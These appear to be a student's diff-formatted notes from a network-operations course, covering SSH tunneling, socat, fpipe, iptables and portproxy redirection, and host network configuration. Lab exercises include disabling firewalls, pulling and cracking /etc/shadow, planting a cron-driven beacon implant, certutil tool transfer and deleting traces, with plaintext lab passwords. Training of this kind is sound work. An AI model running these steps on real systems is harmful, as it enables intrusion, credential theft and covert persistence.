+mstsc /v:linux.ops.local:3389 # on ops 
+netsh advfirewall set allprofiles state off # on T1 // had to use other method linked below (GUI)
+
+net use q: \\linux.ops.local\c$ /u:bubba FrodoLives # on ops 
+copy c:\windows\system32\sysinternalssuite\psloglist.exe q:\temp # on ops 
+psloglist -i 853 security /accepteula > c:\temp\fwlog # on T1 
+copy q:\temp\fwlog c:\temp # on ops 
+
+# on T1 
+del c:\temp\psloglist.exe
+del c:\temp\fwlog
+
+
+# disable win 7 firewall 
+https://windowsloop.com/disable-windows-firewall/
+
+}
+
+{ # CS3 
+ssh -p 22 peg@198.19.37.15 -L9922:100.64.36.41:22
+
+
+ssh -p 9922 meggy@127.0.0.1 -L9932:172.16.1.91:23
+
+telnet 127.0.0.1 9932
+
+
+}
+
+{ # CS4 
+linux.ops.local blocks traffic to 3389 but accepts 389... 
+
+ssh remoteuser@198.18.30.5 -L192.168.11.13:389:192.0.2.78:3389
+
+}
+
+}
+
+}
+
+{ ``` 1.5 Reverse SSH Tunneling ```
+
+# Reasons to use: {
+
+- catch a beacon 
+- open port for access / firewall bypass - so must receive connection from the target 
+- spoof a service to forward traffic / <- can also be applied for MITM 
+
+# Note - typically only need one RPF since SSH is fully bi-directional (like TCP)
+Much like with TCP and file transfers, once a tunnel is established it is a fully bidirectional channel.
+The only difference between a forward and a reverse tunnel is which end of the tunnel starts 
+the connection. Generally in a multi-hop scenario, you only need one reverse tunnel which passes 
+through the forward tunnels used to get to the jump point.        
+
+}
+
+# basic syntax / single hop example {
+ssh haxor@mail.ops.local -R<listener>:<forwarder>
+# RPF difference is now listener = server, forwarder= client // vs LPF -L<listener>:<forwarder>
+		-R<remote port to listen on>:<host to send data to>:<dst port>
+			-by default, remote tgt listens on every interface 0.0.0.0:<>:127.0.0.1:<>
+
+    linux.ops.local     mail.ops.local       xp.ramrod.lab 
+     192.168.11.13      192.168.111.115      192.168.1.101 
+    ---------------     ---------------     ---------------
+    |             |     |             |     |             |
+    |             ------>22           |     |             |
+  /--=============================2525<     |             |
+  \->12345        |     |             |     |             |
+    |             |     |             |     |             |
+    |             |     |             |     |             |
+    ---------------     ---------------     ---------------
+	
+    linux.ops.local     mail.ops.local       xp.ramrod.lab 
+     192.168.11.13      192.168.111.115      192.168.1.101 
+    ---------------     ---------------     ---------------
+    |             |     |             |     |             |
+    |             ------>22           |     |             |
+  /--=============================2525<------             |
+  \->12345        |     |             |     |             |
+    |             |     |             |     |             |
+    |             |     |             |     |             |
+    ---------------     ---------------     ---------------
+
+Syntax
+======
+
+To create tunnels
+  ssh haxor@mail.ops.local -R 2525:127.0.0.1:12345
+		# note: confusing because syntax is the same as LFP 
+			- 127.0.0.1 means forward traffic to loopback on linux.ops.local (the listener)
+				
+To set up listener on linux.ops.local
+  nc -l 12345 < file_to_send
+  
+To connect to tunnel (run from xp.ramrod.lab)
+  nc mail.ops.local 2525 > file_to_get
+
+
+}
+
+{ # add. commands / reference 
+
+#3. Remove an offending SSH key line - sed 
+sed -i '6d' ~/.ssh/known_hosts # removes 6th key line. replace 6 with the 'offending key [num]' 
+
+
+
+}
+
+# Exer 1. Catch the beacon exer. {
+
+ssh remoteuser@ras.fatdeer.lab -R18892:127.0.0.1:22543
+nc -l 22543
+
+# to determine the beaconing IP - on redirector that doesn't have superuser/tcpdump - can use nc -lv 
+- tear down the RPF and just nc -v listen on the receiving port 
+nc -lv 22543
+-> will display conn IP
+
+}
+
+# Exer 2. FTP tunneling { 
+
+# Active vs Passive refresher 
+Active mode issue: It doesn't work when the client is behind a firewall or when network address translation
+(NAT) is used on the client's network. Passive mode FTP was created to solve this problem. 
+It relies on the client sending a PASV command to the server over the control channel. 
+The server response includes a high port number that the client should use to open the data connection 
+
+# Active > passive for tunneling
+In passive mode, the server selects a port that the client should connect to- this port cannot be 
+selected in advance. This does not work with tunneling, where the tunnel cannot be 
+dynamically reconfigured to change the destination port. In active mode, the client 
+gets to select the port that the server will call back on, which gives us a measure of 
+control to force that call back to use a tunnel. 
+
+# FTP - PORT - used to communicate the high listening (ftp data) port 
+PORT 100,100,18,77,100,235 == 100.100.18.77 port 25835 
+Last 2 values = port 
+	p1*256 + p2 
+	(100*256)+235
+	 
+# Tunnels for active FTP: LPF for control channel, RPF for data channel  
+ssh -p22 haxor@192.168.111.115 -L2121:192.168.111.116:21 -R52051:127.0.0.1:52051
+
+# using nc for ftp
+nc 127.0.0.1 2121 
+nc -lv 52051
+
+# FTP nc login 
+USER haxor
+PASS IML33T!
+PORT 192,168,111,115,203,83 # redirector IP and converted RPF listening port
+
+# List dir 
+LIST
+
+# change dir 
+CWD pub/tools
+
+# retreive nc 
+PORT 192,168,111,115,203,83
+nc -lp 52051 > /tmp/nc 
+RETR nc-centos6
+
+
+}
+
+# Exer 3. Troubleshooting RPF {
+- consider: using domain name for RPF = not as risky as LPF, since resolution performed locally on redirector
+
+# watch out for silent failures
+- using port without root privs
+- hanging bc of firewalls - determine based on where hangup: local or remote firewall?
+
+1. netstat # if port failed
+	netstat -punta | grep 616  
+2. 
+
+}
+
+# multi hop example {
+   1337h4x.ops.local    linux.ramrod.lab    ras.fatdeer.lab     aaa.fatdeer.lab
+     192.168.11.15        100.64.36.17        198.18.30.5        172.18.47.17
+    ---------------     ---------------     ---------------     ---------------
+    |             |     |             |     |             |     |             |
+    |             ------>2222         |     |             |     |             |
+    |         9922>===================------>22           |     |             |
+    |           80>=======================================------>80           |
+  /----------------==================================12345<     |             |
+  \->54321        |     |             |     |             |     |             |
+    ---------------     ---------------     ---------------     ---------------
+	
+Syntax
+======
+To create tunnels:
+  ssh -p 2222 mohunt@100.64.36.17 -L9922:198.18.30.5:22
+  ssh -p 9922 remoteuser@127.0.0.1 -L80:172.18.47.17:80 -R12345:127.0.0.1:54321
+  
+To create local listener:
+  nc -l -p 54321
+}
+
+# Exer 4. Port forwarding {
+
+# enable win7 file share 
+netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
+
+# tuns
+ssh -p22 www@192.0.2.80 -L2222:100.64.36.17:2222
+Webific@ti0n
+
+ssh -p2222 root@127.0.0.1 -L2223:192.168.1.101:23 -R445:win7.ops.local:445 
+P@$$w0Rd123
+
+telnet 127.0.0.1 2223
+administrator
+P@$$w0Rd123
+
+net use z: \\192.168.1.102\c$ /u:administrator L33tHax0r # NOTE: must use RD internal IP for tgt to reach, not public!
+																# otherwise, could be connecting to a router (NAT/PAT)
+net use /delete z: 
+
+{ # Exer4. win survey
+Hostname
+Operating system, including version, build and service pack
+Architecture
+System language
+Workgroup/domain
+Most recent users logged into the system
+IP address, netmask, and default gateway
+Value of %windir%
+Process list
+
+hostname
+wmic os get Version, Caption, CountryCode, CSName, Description, InstallDate, SerialNumber, ServicePackMajorVersion, WindowsDirectory /format:list
+wmic computersystem get systemtype, domain, workgroup
+	net config workstation
+psloggedon
+iconfig /all
+echo %windir% 
+pslist
+
+# note below: view recent logins 
+psloglist "Security" -i 528 -s
+
+# to write output of survey 
+COMMAND > z:\temp\commandout.txt
+
+#feedback 
+xp, from hostname
+Microsoft Windows XP Professional, Version 5.1.2600, Build 2601, Service Pack 3, from systeminfo /s xp > p:\temp\systeminfo.txt
+x86-based PC, from systeminfo /s xp > p:\temp\systeminfo.txt
+en-us/English, from systeminfo /s xp > p:\temp\systeminfo.txt
+WORKGROUP, from systeminfo /s xp > p:\temp\systeminfo.txt
+No user logins, from psloglist "Security" -i 528 -s
+IP address: 192.168.1.101/24, Gateway: 192.168.1.1, from ipconfig /all
+C:\Windows, from echo %windir%
+Use the command pslist > p:\temp\pslist.txt
+
+}
+
+}
+
+{ # Exer 5. Beacon for collection 
+
+ssh -p22 jcook@203.0.113.5 -L2221:198.18.30.5:22 
+Br0k3nRecord
+
+ssh -p2221 remoteuser@127.0.0.1 
+	-R6666:192.168.11.121:443
+remote 
+
+# crack 
+scp -P 2221 remoteuser@127.0.0.1:/etc/shadow .
+john --wordlist=/usr/share/dict/words shadow 
+	Bodhisattva (root)
+	remote (remoteuser)
+	
+# iptables - local redirection 
+echo "1" > /proc/sys/net/ipv4/ip_forward
+/sbin/iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 615 -j REDIRECT --to 6666
+
+--- dont need OUTPUT, since not expecting to return traffic
+
+/sbin/iptables -t nat -D PREROUTING -s 0.0.0.0 -p tcp --dport 615 -j REDIRECT --to 6155 &&
+echo "0" > /proc/sys/net/ipv4/ip_forward
+}
+
+{ # Exer 6. Beacons in Practice 
+
+# 1. Deploy beacon {
+
+ssh -p22 remoteuser@198.18.30.5 -L2221:203.0.113.5:22 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+remote
+
+ssh -p2221 jcook@127.0.0.1 -L2222:172.16.0.3:22 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+Br0k3nRecord
+
+ssh -p2222 jcook@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+Br0k3nRecord
+
+# create key pair 
+ssh-keygen -t rsa -f /home/jcook/.ssh/id_www
+
+# copy beacon script - on opsbox
+scp -P2222 /tmp/beacon.sh jcook@127.0.0.1:/home/jcook/.bash_login
+chmod +x /home/jcook/.bash_login  # this shouldnt be necessary
+
+# install key on T2 so autologin 
+ssh-copy-id -i /home/jcook/.ssh/id_www.pub www@192.0.2.80
+
+# debug ssh - why still requiring password? {
+	!!!! always use -v 
+ssh -v www@192.168.0.2.80 
+	noticed ssh looked for id_rsa, not id_www upon connection. so 
+	cp ~/.ssh/id_www ~/.ssh/id_rsa 
+ALSO ensure:
+	on tgt: chmod 700 .ssh/ && chmod 0640 .ssh/authorized_keys # may need 0600
+	on local: chmod 0600 .ssh/id_rsa 
+}
+
+# cron - run every minute
+crontab -e 
+* * * * * /home/jcook/.bash_login
+
+# on opsbox - need linux.ops.local to have id_www.pub authorized key - to accept the beacon
+scp -P 2222 jcook@127.0.0.1:/home/jcook/.ssh/id_www.pub /root/.ssh/authorized_keys
+chmod 0640 /root/.ssh/authorized_keys 
+
+
+}
+
+# 2. RPF / catch beacon {
+
+ssh -p2222 root@100.64.36.17 -L2223:192.0.2.80:22 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+P@$$w0Rd123
+
+ssh -p2223 www@127.0.0.1 -R1337:127.0.0.1:22 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+	# fug idk
+	
+# on T2 / implant host checks this trigger / www.drytortugas
+echo "1337" > .conn
+
+
+# connect to new / auto RPF into T1 
+ssh -p19222 jcook@127.0.0.1 
+
+# setup auto login 
+ssh-keygen 
+scp -P 19222 /root/.ssh/id_rsa.pub jcook@127.0.0.1:/home/jcook/.ssh/authorized_keys
+
+}
+
+{ # feedback diagrams 
+
+implant setup 
+
+linux.ops.local     ras.fatdeer.lab     ccc.raccoon.lab     dual.raccoon.lab
+ 192.168.11.13        198.18.30.5         203.0.113.5          172.16.0.3
+---------------     ---------------     ---------------     ---------------
+|             ------>22           |     |             |     |             |
+|         7722>===================------>22           |     |             |
+|         7822>=======================================------>22           |
+|             |     |             |     |             |     |             |
+|             |     |             |     |             |     |             |
+---------------     ---------------     ---------------     ---------------
+
+beacon setup 
+
+   linux.ops.local    linux.ramrod.lab   web.drytortugas.lab 
+    192.168.11.13       100.64.36.17         192.0.2.80      
+   ---------------     ---------------     ---------------   
+   |             ------>2222         |     |             |   
+   |         7922>===================------>22           |   
+  /---------------==================================13567<   
+  \>22           |     |             |     |             |   
+   |             |     |             |     |             |   
+   ---------------     ---------------     ---------------   
+
+}
+
+}
+
+}
+
+{ ``` 1.6 Non-SSH Tunneling ```
+
+# FPIPE {
+- lightweight redirection program
+- for windows 
+
+#SYNTAX 
+fpipe -l <#incoming port for forwarding#> -r <#outgoing port for forwarding#> <#dst-IP#>
+fpipe -l 8080 -r 80 198.18.30.12
+
+{ # fpipe install & LPF use example
+1. drive sharing for rdp conn / msctl : must enable via GUI (local resources -> more -> drives)
+	- to copy/paste across RDP 
+	1.5 login 
+
+2. copy / paste fpipe via GUI
+
+3. admin cmdprompt on win7, UNCHECK 'protect my computer from...'
+	fpipe -l 8080 -r 80 198.18.30.12
+
+}
+
+}
+
+# SOCAT {
+
+{ # Notes 
+- Pros:
+	- can redirect: TCP,UDP,ICMP,raw IP! 
+	- can convert protocols: good for forwarding non-TCP traffic through ssh (tcp) tunnels
+							- just need socat on entry to tunnel listener and exit on forwarder
+	- can multiplex with FORK option!
+- Cons:
+	- complex configuration (75+ types of addresses)
+	- size (320kb)
+}
+
+#SYNTAX 
+socat <#address1#> <#address2>
+
+{ # LPF setup syntax 
+# LPF Listener SYNAX 
+TCP-LISTEN:8080 
+TCP-LISTEN:8080,fork  # Fork option - handle multiple connections
+
+# LPF Forwarder SYNAX 
+TCP-CONNECT:198.18.30.12 80
+}
+
+# LPF full line 
+socat TCP-LISTEN:8080,fork TCP-CONNECT:198.18.30.12:80
+}
+
+# Exer. 1 - Redirection with fpipe {
+
+ssh -p22 jcook@203.0.113.5 -gL2223:192.0.2.78:23 -gL2224:192.0.2.78:2224
+Br0k3nRecord
+
+copy C:\tools\
+certutil -encode C:\tools\fpipe\fpipe-win32.exe C:\tools\fpipe\fpipe.64
+
+telnet linux.ops.local 2223
+administrator
+KeyF@rg0
+
+	# must user teraterm and paste delay to 150ms / decoded bytes must match
+more > fpipe.64
+certutil -decode fpipe.64 fpipe.exe
+
+
+fpipe -l 2224 -r 23 192.168.108.31
+
+telnet linux.ops.local 2224
+sara
+QueSquared
+
+}
+
+# Exer. 2 - Tunneling UDP with socat (UDP->SSH TCP->UDP conversion) {
+
+ssh -p2222 mohunt@100.64.36.17 -L2221:198.18.30.5:22
+nancy123?
+
+
+socat UDP-LISTEN:137 TCP-CONNECT:127.0.0.1:1137 // on linux.ops.local 
+- will initally fail bc--- fail method (for exercise) 
+
+ssh -p2221 remoteuser@127.0.0.1 -L1137:127.0.0.1:1137
+remote 
+# -L1337:
+
+pscp -P 2221 C:\tools\socat\socat-centos5 remoteuser@linux.ops.local:/home/remoteuser/socat
+
+chmod +x socat 
+./socat TCP-LISTEN:1137 UDP-CONNECT:198.18.30.12:137
+
+nbtstat -a 192.168.11.13
+}
+
+{ # IPTABLES - nat conversion  
+
+# local redirection (bypass restricted ports / RPF use) { 
+echo "1" > /proc/sys/net/ipv4/ip_forward
+/sbin/iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 615 -j REDIRECT --to 6666
+
+--- dont need OUTPUT, since not expecting to return traffic
+
+/sbin/iptables -t nat -D PREROUTING -s 0.0.0.0 -p tcp --dport 615 -j REDIRECT --to 6155 &&
+echo "0" > /proc/sys/net/ipv4/ip_forward
+}
+
+# general traffic redirection {
+
+# syntax 
+iptables -t nat -A PREROUTING -p tcp --dport <receiving port> -j DNAT --to-destination <tgt-IP>:<tgt-port>
+iptables -t nat -A POSTROUTING -p tcp -d <tgt-IP> --dport <tgt-port> -j SNAT --to-source <local-IP> 
+	# prerouting redirects the packet upon reception // postrouting changes exiting traffics IP (so proceeding traffic can return to this host)
+
+
+# example { 
+
+#setup 
+echo "1" > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.42.10:80
+iptables -t nat -A POSTROUTING -p tcp -d 192.168.42.10 --dport 80 -j SNAT --to-source 192.168.42.1
+
+#teardown
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.42.10:80
+iptables -t nat -A POSTROUTING -p tcp -d 192.168.42.10 --dport 80 -j SNAT --to-source 192.168.42.1
+echo "0" > /proc/sys/net/ipv4/ip_forward
+}
+
+
+}
+
+}
+
+{ # PORTPROXY (windows netsh interface) 
+
+# syntax - LPF 
+netsh interface portproxy set v4tov4 listenport=8888 connectaddress=C.C.C.C connectport=80
+	#optional: listenaddress=127.0.0.1 // config. interface for listener, only tcp is supported 
+	netsh interface portproxy set v4tov4 listenaddress=0.0.0.0 listenport=8888 connectaddress=C.C.C.C connectport=80
+}
+
+# Exer. 3 - Redirecting with portproxy and iptables {
+ops
+-> J1 
+--> T1  
+---> T2 
+----> T3 
+
+{ # feedback diagram
+
+1337h4x.ops.local    ras.fatdeer.lab   win7.drytortugas.lab    foursquare          rockgarden
+  192.168.11.15        198.18.30.5         192.0.2.71        192.168.108.31      192.168.113.177
+ ---------------     ---------------     ---------------     ---------------     ---------------
+ |             ------>22           |     |             |     |             |     |             |
+ |         1123>====================----->23           |     |             |     |             |
+ |         1223>====================----->1223--------------->23           |     |             |
+ |         1323>====================----->1323--------------->1323--------------->23           |
+ |             |     |             |     |             |     |             |     |             |
+ |             |     |             |     |             |     |             |     |             |
+ ---------------     ---------------     ---------------     ---------------     ---------------
+
+}
+
+# LPF to T1 telnet, T2 telnet, T3 telnet 
+ssh remoteuser@198.18.30.5 -L2221:192.0.2.71:23 -L2222:192.0.2.71:2222 -L2223:192.0.2.71:2223
+remote 
+
+# T1 
+telnet 127.0.0.1 2221  -l key
+thisPASSWORD
+Administrator / 
+$eCret
+
+runas /user:Administrator "netsh interface portproxy set v4tov4 listenaddress=0.0.0.0 listenport=2222 connectaddress=192.168.108.31 connectport=23"
+runas /user:Administrator "netsh interface portproxy set v4tov4 listenaddress=0.0.0.0 listenport=2223 connectaddress=192.168.108.31 connectport=2223"
+
+
+#T2 
+telnet 127.0.0.1 2222 -l sara
+QueSquared
+root/R3dRubberB@ll
+
+#iptables -L2223 -> T3 23
+
+echo "1" > /proc/sys/net/ipv4/ip_forward
+/sbin/iptables -t nat -I PREROUTING -p tcp --dport 2223 -j DNAT --to-destination 192.168.113.177:23
+/sbin/iptables -t nat -I POSTROUTING -p tcp -d 192.168.113.177 --dport 23 -j SNAT --to-source 192.168.108.31
+/sbin/iptables -t filter -I INPUT -s 0.0.0.0 -p tcp --dport 2223 -j ACCEPT
+/sbin/iptables -P FORWARD ACCEPT
+	#iptables -A FORWARD -p tcp --dport 23 -d 192.168.113.177 -s 172.17.10.71 -j ACCEPT 
+	
+# teardown 
+/sbin/iptables -t nat -D PREROUTING -p tcp --dport 2223 -j DNAT --to-destination 192.168.113.177:23
+/sbin/iptables -t nat -D POSTROUTING -p tcp -d 192.168.113.177 --dport 23 -j SNAT --to-source 192.168.108.31
+/sbin/iptables -t filter -D INPUT -s 0.0.0.0 -p tcp --dport 2223 -j ACCEPT
+/sbin/iptables -P FORWARD DROP
+echo "0" > /proc/sys/net/ipv4/ip_forward
+
+#T3 
+telnet 127.0.0.1 2223 -l cole 
+B!tumin0u$
+
+
+}
+
+}
+
+{ ``` 1.7 Network Troubleshooting (REVIEW) ```
+
+# iptables troubleshooting 
+- is conntrack kernel module not loaded?
+	lsmod | grep conntrack
+
+
+#1. BPF (wireshark/tcpdump) {
+
+# 1. Port filtering - identify web server 
+// Wireshark
+tcp.srcport == 80 or tcp.srcport == 443
+
+//tcpdump
+tcpdump -r [packet] -nS tcp src port == 80 or src port = 443
+
+#2. Protocol filtering - identify dhcp details via ARP == divulge network environment ( network IP scheme )
+//wireshark
+arp 
+
+//tcpdump
+tcpdump -r [file] arp
+
+#3. Comparing bytes - find cisco discovery protocol ID (2000) via Logical Link Control header filter
+// wireshark
+llc.cisco_pid = 0x2000
+
+// tcpdump 
+tcpdump -r [file] -tvvvnr 'ether[20:2]=0x2000'
+
+
+#4. Complex filters - identify gateway 
+ 
+// wireshark
+ipsrc==192.168.1.2 && !(ip.dst==192.168.1.0/24)
+	# find traffic from src host + filter out traffic outside network. View MAC dst to find MAC of gateway 
+
+	!(ip.dst==192.168.1.0/24) # alt. method 
+		# find traffic exiting the network, must hit gateway; arp requests mapping the layer 2 to layer 3 	
+		- any dst MAC == gateway 
+
+eth.src==[MAC] && eth.type == 0x0806 
+	# filter gateway mac and by arp protocol 
+	
+// tcpdump 
+tcpdump -c 1 -tennr [file] 'src host 192.168.1.2 and not dst net 192.168.1.0/24'
+	optional:
+		-e // view MAC 
+		-c 1 // view 1 packet 
+	# select dst mac 
+	
+tcpdump -tennr [file] 'ether source host [MAC] and ether[12:2]=0x0806'
+}
+
+#2. Windows Networking {
+- always ask: what does this tell me about system's network
+			- what is its role in the network
+
+# is this the right host (hostname/IP). What is the network size? Default gateway? MAC? DNS server? DNS Suffix?			
+ipconfig /all 
+
+# display dns cache - preloaded data from hosts file AND recent obtained records 
+ipconfig /displaydns | more 
+		
+hostname
+
+netstat -rn 
+	route print 
+	
+netstat -anob | more 
+
+arp -a 
+
+# display domain name (echo only shows netBIOS version of domain name. If NOT in domain, echo returns system name!)
+systeminfo | findstr C:/"Domain"
+wmic computersystem get domain 
+echo %userdomain%
+
+# discard DHCP config on net adapters with DCHP enabled 
+ipconfig /release 
+
+# reestablish DHCP configs
+ipconfig /renew 
+
+# GUI: Network and Internet -> Network Connections : modify IP address, netmask, gateway, DNS server 
+
+# CLI: modify IP address, netmask, gateway, DNS server 
+netsh interface ipv4 set address name="Local Area Connection 2" source=static address=192.168.18.76 mask=255.255.255.0 gateway=192.168.18.253
+
+# rename computername: GUI (control panel -> system and sec -> system)
+
+# CLI: 
+wmic computersystem where name=%computername% call rename name=dev_PC_06
+	# will NOT change until reboot 
+	
+# add static route 
+route add -p 192.168.103.0 mask 255.255.255.0 192.168.18.45 metric 1
+	# -p = persistent across reboots 
+
+# delete static route 
+route delete 192.168.103.0
+
+# add/remove routing path 
+netsh interface ipv5 add route 192.168.103.0/24 "Local Area Connection 2" 192.168.18.45 Type
+netsh interface ipv4 delete route 192.168.103.0/24 "Local Area Connection 2" 192.168.18.45 
+
+# permanent static ARP table entry 
+arp -s 192.168.18.82 [MAC]
+
+# delete arp entry
+arp -d 192.168.18.82
+
+# delete all arp entries
+arp -d *
+
+# reset DNS cache, discarding entries 
+ipconfig /flushdns 
+
+# manually initiates dynamic DNS registration for hosts/ips on system 
+ipconfig /registerdns 
+
+# manually add/ remove DNS server to system config - if succ, no output 
+netsh dnsclient add dnsserver "Local Area Connection 2" 8.8.8.8
+netsh dnsclient delete dnsserver "Local Area Connection 2" 8.8.8.8
+
+# query default DNS server for domain name/ IP address relation info
+dnsquery 
+
+# specify netstat protocol 
+netstat -p tcp
+}
+
+#3. UNIX networking { 
+- always consider: on disk vs running config 
+	- change since system boot?
+	- changes on system boot?
+
+- always ask
+	- what does this info tell me about network 
+	- what is this system's role in network 
+
+{ # Part 01 - Solaris (10 and older)
+
+``` startup config ```
+
+# persistent network config 
+ifconfig -a 
+
+# locate hostname 
+cat /etc/hostname.e1000g0
+
+# determine IP for hostname 
+cat /etc/hosts 
+	ls -l /etc/inet/ipnodes # on older solaris < 10 
+
+# system's canonical hostname 
+cat /etc/nodename 
+
+# netmasks for each connected network
+cat /etc/netmasks
+
+# default gateway
+cat /etc/defaultrouter 
+	cat /etc/gateways # solaris systems with more complicated routing tables/ more interfaces 
+		echo 'net 0.0.0.0 gateway 192.168.11.254 metric 1 passive' > /etc/gateways; rm /etc/defaultrouter'; touch /etc/notrouter'
+		/etc/notrouter == if present, not router
+
+# dnsserver - dns query/ default domain for host queries without FQDN
+cat /etc/resolv.conf 
+
+``` ^^^ changing persistent conf = edit the files and reboot ```
+
+# add static route - IF /etc/gateways is in use 
+echo 'net 172.17.0.0/25' gateway 192.168.11.15 metric 2 passive' >> /etc/gateways 
+# otherwise, use /etc/inet/static_routes file 
+echo 'net 172.17.0.0/25 192.168.11.15' >> /etc/inet/static_routes 
+
+``` running config ``` 
+ifconfig e1000g0 # shows ip, netsmask in hex, MAC (when ran in root)
+
+hostname 
+
+netstat -rn 
+
+cat /etc/resolv.conf # persisent config and active config are the same thing 
+
+arp -an # recently communicated machines
+
+netstat -an -f inet -p tcp # tcp socket table  
+	netstat -an -f inet -p udp # udp socket table 
+}
+
+{ # Part 02 - Linux (redhat) (RHEL, CentOS, Fedora) 
+``` startup conf ```
+ifconfig 
+
+# interface config 
+cat /etc/sysconfig/network-scripts/ifcfg-eth0 
+	shell variables used by scripts in directory. most vars are optional, may/may not appear :
+		- DEVICE=eth0 # interface name 
+		- ONBOOT=yes # enabled on boot
+		- HWADDR=X # (optional but must be correct or wont be enabled)
+		- BOOTPROTO: static # static config, otherwise DHCP 
+			- IPADDR=192.168.11.13 # these only exist if static above 
+			- NETMASK=255.255.255.0 / PREFIX=24 # CIDR 
+
+# traditional: hostname/ default gateway 
+cat /etc/sysconfig/network 
+	cat /etc/ifcfg # default gateway may be here too 
+	
+# hostname - systemd based linux (rhel7, debian)
+echo linux.ops.local > /etc/hostname 
+
+# hostname /IP address MAY be in /etc/hosts - but not required
+cat /etc/hosts
+
+# static route stored in route file per interface and alternate syntax 
+echo '172.17.0.0/25 via 192.168.11.15' > /etc/sysconfig/network-scripts/route-eth0 
+	echo -e 'ADDRESS0=172.17.0.0\nNETMASK0=255.255.255.128\nGATEWAY0=192.168.11.15' > /etc/sysconfig/network-scripts/route-eth0 ; cat /etc/sysconfig/network-scripts/route-eth0
+	
+``` running conf ``` - almost same as solaris, minor diff in cli 
+ifconfig 
+	- address, netmask, MAC 
+	
+hostname 
+
+netstat -rn 
+
+cat /etc/resolv.conf # persistent and active DNS config = same 
+
+arp -vn # arp cache 
+
+netstat -natup 
+
+
+}
+
+{ # Part 03a - Move solaris to diff network (diff IP scheme, MAC scheme, domain name/hostname convention)
+
+``` change running state ``` 
+
+``` NOTE: IRL USE 'ip addr' TO MODIFY INTERFACES IF POSSIBLE; OTHERWISE AN IFCONFIG TYPO = RISK LOCKOUT FROM DEVICE``` 
+	- ifconfig modifies default interface on error == BAD 
+	- ip a creates subinterface
+
+# modify interface  
+ifconfig e1000g0 172.17.31.14 netmask 255.255.255.0 up ; ifconfig e1000g0 
+ifconfig e1000g0 down 
+
+# spoof MAC address to fit into new network scheme 
+ifconfig e1000g0 ether [MAC] 
+
+# enable dhcp on/off interface 
+ifconfig e1000g0 dhcp start 
+ifconfig e1000g0 dhcp release  
+
+# change hostname 
+hostname [newhostname]
+
+# change default gateway ; delete the old default 
+route add default 172.18.31.253; route delete default 192.168.11.254; netstat -rn
+
+# add / delete static route 
+route add 172.17.0.0/25 172.18.31.12 ; netstat -rn 
+route delete 172.17.0.0/25 172.18.31.12 ; netstat -rn 
+
+# add / delete static arp entries 
+arp -s 172.18.31.12 [MAC]
+arp -d 172.18.31.12; arp -an 
+
+# update resolv.conf to change DNS settings 
+echo -e 'domain fatdeer.lab\nnameserver 192.0.2.2' > /etc/resolv.conf; cat /etc/resolv.conf 
+
+# verify 
+nslookup www 
+
+``` make persistent ``` 
+vim /etc/hosts 
+	# change host ip address and hostname 
+
+# also change hostname 
+echo [hostname] > /etc/nodename 
+
+# set mac address 
+echo 'hamster ether [MAC]' > /etc/hostname.e1000g0
+
+# if need to set interface to use DHCP
+touch /etc/dhcp.e1000g0 
+
+# update netmasks for this network 
+echo -e '172.18.31.0\t255.255.255.0' >> /etc/netmasks 
+
+# update defaultroute/gateways file 
+echo 172.18.31.253 > /etc/defaultrouter
+
+# update static routes 
+echo '172.17.0.0/25 172.18.31.12' > /etc/inet/static_routes 
+
+
+}
+
+{ # Part 03b - Move linux (rhel) to diff network (diff IP scheme, MAC scheme, domain name/hostname convention) 
+
+``` !!! IRL USE 'ip addr' TO MODIFY INTERFACES IF POSSIBLE; OTHERWISE AN IFCONFIG TYPO = RISK LOCKOUT FROM DEVICE !!! ``` 
+
+``` ifconfig ONLY copied from reference videos ``` 
+
+``` change running state ``` 
+
+# change ip address /netmask 
+ifconfig eth0 172.18.31.13 netmask 255.255.255.0 up ; ifconfig eth0 # DONT USE 
+ifconfig eth 0 down # would clear out all settings on interface 
+
+# spoof MAC
+ifconfig eth0 hw ether [MAC] # DONT USE
+
+# up === writes settings from ON DISK configuration files; NORMAL method to enable dhcp
+ifconfig eth0 up; ifconfig eth0 
+
+# enable dhcp - atl method 
+dhclient eth0 
+dhcpcd 
+
+# turn off
+dhcpdhclient -r eth0 
+
+# change hostname 
+hostname goldfish.fatdeer.lab
+hostname 
+
+# change default gateway 
+route add default gw 172.18.31.253 ; netstat -rn 
+
+# add/del static route 
+route add -net 172.17.0.0 netmask 255.255.255.128 gw 172.18.31.12; netstat -rn 
+route del -net 172.17.0.0 netmask 255.255.255.128 gw 172.18.31.12; netstat -rn 
+
+# add / delete static ARP entry 
+arp -s 172.18.31.12 [MAC]; arp -vn 
+arp -d 172.18.31.12
+
+# confirm 
+ping -c1 1 172.18.31.14
+
+~~~~~~~~~~~ If no ifconfig, use /// ip \\\ or ss command instead ~~~~~~~~~~~
+
+``` make persistent ``` 
+
+# modify interface file 
+vi /etc/sysconfig/network-scripts/ifcfg-eth0 
+	- IPADDR: change to new IP 
+	- HWADDR: *Cannot modify, must match physical MAC 
+ADD - MACADDR: [new MAC]
+OPT - BOOTPROTO: DHCP # to enable DHCP on int 
+		- remove IPADDR, NETMASK, PREFIX, GATEWAY variables 
+		
+vi /etc/sysconfig/network # modify hostname/gateway vars IF in network file 
+	HOSTNAME=
+	GATEWAY= 
+	
+# update hostname if in /etc/hostname or /etc/hosts file 
+vi /etc/hostname 
+vi etc/hosts 
+
+# if needed, update static routes 
+echo '172.17.0.0/25 via 172.18.31.12' > /etc/sysconfig/network-scripts/route-eth0 
+
+# NOTE: some  lin systems have multiple net profiles configd, and store elsewhere. Update these too. 
+ls /etc/sysconfig/networking/devices/ /etc/sysconfig/networking/profiles/default 
+
+}
+
+{ ``` ip a ``` 
+
+# add/ remove IP address to interface 
+sudo ip addr add 192.168.4.44/24 dev enp0s3 
+sudo ip addr del 192.168.4.44/24 dev enp0s3
+
+# add route 
+sudo ip addr add 192.168.121.1/24 dev enp0s8
+
+# delete default route 
+sudo ip route delete default via 192.168.4.1 dev enp0s8
+
+
+}
+
+}
+
